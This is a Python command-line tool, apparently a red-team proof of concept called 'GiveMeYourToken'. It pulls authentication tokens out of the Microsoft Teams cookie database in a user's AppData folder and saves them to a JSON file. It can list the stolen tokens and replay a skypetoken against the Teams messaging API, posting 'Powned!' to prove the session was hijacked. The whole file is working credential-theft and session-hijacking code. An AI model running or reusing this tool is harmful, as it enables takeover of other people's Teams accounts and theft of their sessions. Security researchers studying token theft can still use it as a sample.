import os
import sqlite3
import requests
import argparse
import logging
import json
import pandas

default_cookie_file="{0}/cookies/output.json".format(os.path.dirname(os.path.abspath(__file__)))

def self_message(token_id,cookie_file=default_cookie_file):
    with open(cookie_file) as read_cookie_file:
            cookies_dict = json.load(read_cookie_file)

    token_dict = cookies_dict[int(token_id)]

    if not token_dict.get('Name') =='skypetoken_asm':
        logging.warning('skypetoken is needed for Teams API authentication.')
        return

    skype_token = token_dict['Value']

    headers = {"Authentication":"skypetoken={0}".format(skype_token)}
    data = {"content":"Powned!",
    "messagetype":"RichText/Html",
    "contenttype":"text"}

    req= requests.post("https://emea.ng.msg.teams.microsoft.com/v1/users/ME/conversations/48:notes/messages", headers=headers, json=data)
    if req.status_code == 201:
        logging.warning("Message successfully sent on Teams!")
    else:
        logging.warning('Error {0}'.format(req.status_code))


def read_token(input=default_cookie_file):
    with open(input) as cookie_file:
            results_data = json.load(cookie_file)

    data_list = [[data['Host'],data['Name'],data['Value'],data['Expires_utc']] for idx,data in enumerate(results_data)]
    headers=['Host', 'Name','Value','Expires_utc']
    print(pandas.DataFrame(data_list, None,headers))
    print('                                         ')


def dump_token(path,output=default_cookie_file):
    logging.warning('Starting Extract Token From Teams')
    #leveldb_path="{0}\Microsoft\Teams\Local Storage\leveldb".format(AppDataPath)

    try:
        conn = sqlite3.connect(path)
        logging.info("{0} database successfully opened".format(path))
        cursor = conn.execute("SELECT host_key, name, value, expires_utc from cookies")
    except:
        logging.warning('Failed to connect to database.')
        return


    if not os.path.exists(output):
        os.makedirs(os.path.dirname(output), exist_ok=True)
        results_data=[]
    else:
        with open(output) as results_file:
            results_data = json.load(results_file)        

    for row in cursor:
        if "token" in row[1]:
            data= {
                "Host": row[0],
                "Name": row[1],
                "Value": row[2],
                "Expires_utc": row[3]
            }

            if data not in results_data:
                results_data.append(data)

            logging.info ("Host Key = {0}".format(row[0])) 
            logging.info ("Name = {0}".format(row[1]))
            logging.info ("Value = {0}".format(row[2]))
    conn.close()

    logging.warning('Tokens dumped!')
    
    with open(output, "w") as results_file:
        json.dump(results_data, results_file)

    

if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='GiveMeYourToken',
    usage='%(prog)s [--dump-tokens] [--read-tokens] [--self-message] [--db-path] [--cookies-file] [--token-id] ',
    description='Retrieve tokens from Teams sqlite file and use it through Teams API.',
    prefix_chars='--')

    parser.add_argument(
    '-d', '--debug',
    help="Print lots of debugging statements",
    action="store_const", dest="loglevel", const=logging.DEBUG,
    default=logging.WARNING)

    parser.add_argument(
    '-v', '--verbose',
    help="Be verbose",
    action="store_const", dest="loglevel", const=logging.INFO)

    parser.add_argument('--dump-tokens',
    action="store_true",
    help='Use this argument to dump tokens from Teams database.')

    parser.add_argument('--read-tokens',
    action="store_true",
    help='Use this argument to read tokens previously retrieved.')

    parser.add_argument('--self-message',
    help='Send message to the Private self Teams channel.',
    action="store_true",
    required=False,
    dest="self_message")

    parser.add_argument('--db-path',
    help='Specify the path of db. Default is %%AppData%%\Microsoft\Teams\Cookies',
    required=False,
    dest="db_path")

    parser.add_argument('--cookies-file',
    help='Specify path for json output file',
    required=False,
    dest="cookies_file")

    parser.add_argument('--token-id',
    help='Use --read-tokens and select the id of the token you want to use. Mandatory for --self-message',
    required=False,
    dest="token_id")

    args = parser.parse_args()
    logging.basicConfig(level=args.loglevel)
    if args.dump_tokens:
        if not args.db_path:
            app_data_path=os.getenv('AppData')
            cookie_db_path="{0}\Microsoft\Teams\Cookies".format(app_data_path)
        else:
            cookie_db_path = args.db_path

        if args.cookies_file:
            dump_token(cookie_db_path, args.cookies_file)
        else:
            dump_token(cookie_db_path)
    
    if args.read_tokens:
        if args.cookies_file:
            read_token(args.cookies_file)
        else:
            read_token()

    if args.self_message:
        if not args.token_id:
            logging.warning('Token ID is required!')
            exit()

        if args.cookies_file:
            self_message(args.token_id, args.cookies_file)
        else:
            self_message(args.token_id)


